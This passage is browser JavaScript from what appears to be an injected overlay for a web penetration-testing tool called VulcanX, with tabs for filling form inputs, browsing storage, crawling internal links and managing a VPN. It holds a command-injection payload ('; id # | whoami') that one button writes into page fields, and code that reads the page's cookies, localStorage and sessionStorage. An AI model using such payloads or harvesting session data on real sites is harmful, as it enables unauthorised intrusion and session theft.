                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    };
                    tdActions.appendChild(fillSSTI);
                    
                    var fillCMDi = document.createElement('button');
                    fillCMDi.innerText = 'Fill CMDi';
                    fillCMDi.style.fontSize = '9px';
                    fillCMDi.style.background = '#113300';
                    fillCMDi.style.border = '1px solid #22ff00';
                    fillCMDi.style.color = '#fff';
                    fillCMDi.style.borderRadius = '3px';
                    fillCMDi.style.cursor = 'pointer';
                    fillCMDi.onclick = function() {
                        var payload = "; id # | whoami";
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, payload); } else { input.value = payload; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.focus();
                        input.style.border = '2px solid #22ff00';
                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    };
                    tdActions.appendChild(fillCMDi);

                    tr.appendChild(tdActions);
                    tbody.appendChild(tr);
                });
                table.appendChild(tbody);
                container.appendChild(table);

            } else if (tab === 'storage') {
                container.innerHTML = '';
                
                var refBtn = document.createElement('button');
                refBtn.innerText = 'Refresh Storage';
                refBtn.style.width = '100%';
                refBtn.style.padding = '8px';
                refBtn.style.background = '#222';
                refBtn.style.color = '#fff';
                refBtn.style.border = '1px solid #444';
                refBtn.style.borderRadius = '4px';
                refBtn.style.cursor = 'pointer';
                refBtn.style.fontWeight = 'bold';
                refBtn.style.marginBottom = '12px';
                refBtn.onclick = function() { window.__vulcanx_render(); };
                container.appendChild(refBtn);

                var items = [];
                
                // Cookies
                if (document.cookie) {
                    document.cookie.split(';').forEach(c => {
                        var parts = c.split('=');
                        items.push({
                            source: 'Cookie',
                            key: parts[0] ? parts[0].trim() : '',
                            value: parts.slice(1).join('=')
                        });
                    });
                }
                
                // LocalStorage
                for (var i = 0; i < localStorage.length; i++) {
                    var k = localStorage.key(i);
                    items.push({
                        source: 'Local',
                        key: k,
                        value: localStorage.getItem(k)
                    });
                }

                // SessionStorage
                for (var i = 0; i < sessionStorage.length; i++) {
                    var k = sessionStorage.key(i);
                    items.push({
                        source: 'Session',
                        key: k,
                        value: sessionStorage.getItem(k)
                    });
                }

            } else if (tab === 'map') {
                container.innerHTML = '';
                
                var scanBtn = document.createElement('button');
                scanBtn.innerText = 'Scan LinkMap';
                scanBtn.style.width = '100%';
                scanBtn.style.padding = '8px';
                scanBtn.style.background = '#800000';
                scanBtn.style.color = '#fff';
                scanBtn.style.border = '1px solid #ff0055';
                scanBtn.style.borderRadius = '4px';
                scanBtn.style.cursor = 'pointer';
                scanBtn.style.fontWeight = 'bold';
                scanBtn.style.marginBottom = '12px';
                
                var statusDiv = document.createElement('div');
                statusDiv.style.marginBottom = '12px';
                statusDiv.style.fontSize = '10px';
                statusDiv.style.color = '#aaa';
                statusDiv.innerText = "Status: Ready";
                
                var linksList = document.createElement('ul');
                linksList.style.listStyleType = 'none';
                linksList.style.padding = '0';
                linksList.style.margin = '0';
                
                var links = Array.from(document.querySelectorAll('a[href]')).map(a => a.href);
                var internalLinks = links.filter(href => href.startsWith(window.location.origin) && !href.includes('#'));
                var uniqueLinks = [...new Set(internalLinks)];
                
                scanBtn.onclick = async function() {
                    if (uniqueLinks.length === 0) {
                        alert("No internal links found to scan.");
                        return;
                    }
                    var confirmScan = confirm("Start background scan of " + uniqueLinks.length + " internal links? This will issue background GET requests.");
                    if (confirmScan) {
                        scanBtn.disabled = true;
                        scanBtn.style.opacity = '0.5';
                        statusDiv.innerText = `Scanning: 0 / ${uniqueLinks.length}`;
                        
                        let completed = 0;
                        for (let i = 0; i < uniqueLinks.length; i++) {
                            let link = uniqueLinks[i];
                            let li = linksList.children[i];
                            try {
                                li.style.color = '#ffcc00'; // in progress
                                
                                // Open link in a new background tab
                                var newWin = window.open(link, '_blank');
                                
                                // Wait for it to load, then close it
                                await new Promise(r => setTimeout(r, 2500)); 
                                if (newWin && !newWin.closed) {
                                    newWin.close();
                                }
                                
                                li.style.color = '#00ff55'; // done
                            } catch(e) {
                                li.style.color = '#ff0055'; // error
                            }
                            completed++;
                            statusDiv.innerText = `Scanning: ${completed} / ${uniqueLinks.length}`;
                        }
                        
                        statusDiv.innerText = 'Scan Complete! Check Traffic and Findings tabs.';
                        setTimeout(() => {
                            scanBtn.disabled = false;
                            scanBtn.style.opacity = '1';
                        }, 2000);
                    }
                };
                
                container.appendChild(scanBtn);
                container.appendChild(statusDiv);
                
                uniqueLinks.forEach(link => {
                    var li = document.createElement('li');
                    li.style.padding = '4px 0';
                    li.style.borderBottom = '1px solid #333';
                    li.style.fontSize = '10px';
                    li.style.wordBreak = 'break-all';
                    li.style.color = '#aaa';
                    li.innerText = link.replace(window.location.origin, '');
                    linksList.appendChild(li);
                });
                
                if (uniqueLinks.length === 0) {
                    var emptyDiv = document.createElement('div');
                    emptyDiv.innerText = 'No internal links found on this page.';
                    emptyDiv.style.color = '#666';
                    emptyDiv.style.textAlign = 'center';
                    emptyDiv.style.marginTop = '20px';
                    container.appendChild(emptyDiv);
                } else {
                    container.appendChild(linksList);
                }
            } else if (tab === 'vpn') {
                container.innerHTML = '';
                
                var vpnContainer = document.createElement('div');
                vpnContainer.style.padding = '10px';
                
                var title = document.createElement('h3');
                title.innerText = '🔒 VPN Connection Manager';
                title.style.color = '#ff0055';
                title.style.marginTop = '0';
                vpnContainer.appendChild(title);
                
                var ipDisplay = document.createElement('div');
                ipDisplay.id = 'vx-vpn-ip';
                ipDisplay.style.marginBottom = '15px';
                ipDisplay.style.padding = '10px';
                ipDisplay.style.background = '#1a1a24';
                ipDisplay.style.border = '1px solid #444';
                ipDisplay.style.borderRadius = '4px';
                ipDisplay.innerText = 'Checking IP...';
                vpnContainer.appendChild(ipDisplay);
                
                var fetchBtn = document.createElement('button');
                fetchBtn.innerText = '1. Fetch VPNBook Config & Credentials';
                fetchBtn.style.width = '100%';
                fetchBtn.style.padding = '10px';
                fetchBtn.style.background = '#004488';
                fetchBtn.style.color = '#fff';
                fetchBtn.style.border = '1px solid #0088ff';
                fetchBtn.style.borderRadius = '4px';
                fetchBtn.style.cursor = 'pointer';
                fetchBtn.style.fontWeight = 'bold';
                fetchBtn.style.marginBottom = '10px';
                
                var statusDiv = document.createElement('div');
                statusDiv.id = 'vx-vpn-status';
                statusDiv.style.marginBottom = '15px';
                statusDiv.style.color = '#ffcc00';
                statusDiv.style.fontSize = '11px';
                
                var connectBtn = document.createElement('button');
                connectBtn.innerText = '2. Connect via OpenVPN';
                connectBtn.style.width = '100%';
                connectBtn.style.padding = '10px';
                connectBtn.style.background = '#800000';
                connectBtn.style.color = '#fff';
                connectBtn.style.border = '1px solid #ff0055';
                connectBtn.style.borderRadius = '4px';
                connectBtn.style.cursor = 'pointer';
                connectBtn.style.fontWeight = 'bold';
                connectBtn.style.marginBottom = '10px';
                connectBtn.disabled = true;
                connectBtn.style.opacity = '0.5';
                
                var checkIpBtn = document.createElement('button');
                checkIpBtn.innerText = '3. Refresh IP';
                checkIpBtn.style.width = '100%';
                checkIpBtn.style.padding = '10px';
                checkIpBtn.style.background = '#222';
                checkIpBtn.style.color = '#fff';
                checkIpBtn.style.border = '1px solid #444';
                checkIpBtn.style.borderRadius = '4px';
                checkIpBtn.style.cursor = 'pointer';
                checkIpBtn.style.fontWeight = 'bold';
                checkIpBtn.style.marginBottom = '10px';
                
                vpnContainer.appendChild(fetchBtn);
                vpnContainer.appendChild(statusDiv);
                vpnContainer.appendChild(connectBtn);
                vpnContainer.appendChild(checkIpBtn);
                container.appendChild(vpnContainer);
                
                // Functions
                const updateIp = async () => {
                    ipDisplay.innerText = 'Fetching IP info...';
                    try {
                        let res = await fetch('/api/check_ip');
                        let data = await res.json();
                        if (data.status === 'ok') {
                            ipDisplay.innerHTML = `<strong>IP:</strong> ${data.ip} | <strong>Location:</strong> ${data.city}, ${data.country}<br><strong>Org:</strong> ${data.org}`;
                        } else {
                            ipDisplay.innerText = 'Error checking IP: ' + data.error;
                        }
                    } catch(e) {
                        ipDisplay.innerText = 'Failed to reach /api/check_ip endpoint.';
                    }
                };
                
                updateIp();
                checkIpBtn.onclick = updateIp;
                
                fetchBtn.onclick = async () => {
                    fetchBtn.innerText = 'Fetching...';
                    fetchBtn.disabled = true;
                    statusDiv.innerText = 'Downloading config and scraping password from VPNBook...';
                    try {
                        let res = await fetch('/api/vpn', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({action: 'auto_fetch_vpnbook'})
                        });
                        let data = await res.json();
                        if (data.status === 'ok') {
                            statusDiv.innerHTML = `Successfully fetched!<br><strong>User:</strong> ${data.user}<br><strong>Pass:</strong> ${data.pass}<br><strong>Config:</strong> ${data.ovpn_path}`;
                            connectBtn.disabled = false;
                            connectBtn.style.opacity = '1';
                        } else {
                            statusDiv.innerText = 'Error: ' + data.error;
                        }
                    } catch(e) {
                        statusDiv.innerText = 'API request failed: ' + e;
                    }
                    fetchBtn.innerText = '1. Fetch VPNBook Config & Credentials';
                    fetchBtn.disabled = false;
                };
                
                connectBtn.onclick = async () => {
                    connectBtn.innerText = 'Connecting...';
                    connectBtn.disabled = true;
                    statusDiv.innerText = 'Launching OpenVPN and setting up proxy rules...';
                    try {
                        let res = await fetch('/api/vpn', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({action: 'connect'})
                        });
                        let data = await res.json();
                        if (data.status === 'ok') {
                            statusDiv.innerHTML = '<span style="color:#00ff55">✅ ' + data.message + '</span>';
                            setTimeout(updateIp, 2000);
                        } else {
                            statusDiv.innerText = 'Error: ' + data.error;
                            connectBtn.disabled = false;
                        }
                    } catch(e) {
                        statusDiv.innerText = 'API request failed: ' + e;
                        connectBtn.disabled = false;
                    }
                    connectBtn.innerText = '2. Connect via OpenVPN';
                };
            }
        };

        window.__vulcanx_toggle_inputs = function() {
            var inputs = document.querySelectorAll('input:not([type="hidden"]), textarea');
            inputs.forEach(input => {
                if (window.__vulcanx_state.highlighting) {
                    input.setAttribute('data-vx-border', input.style.border || '');
                    input.style.border = '2px dashed #ff0055';
                    input.style.boxShadow = '0 0 10px rgba(255, 0, 85, 0.4)';
                } else {
                    var oldBorder = input.getAttribute('data-vx-border') || '';
                    input.style.border = oldBorder;
                    input.style.boxShadow = '';
                }
            });
        };
    } catch(e) {}
})();
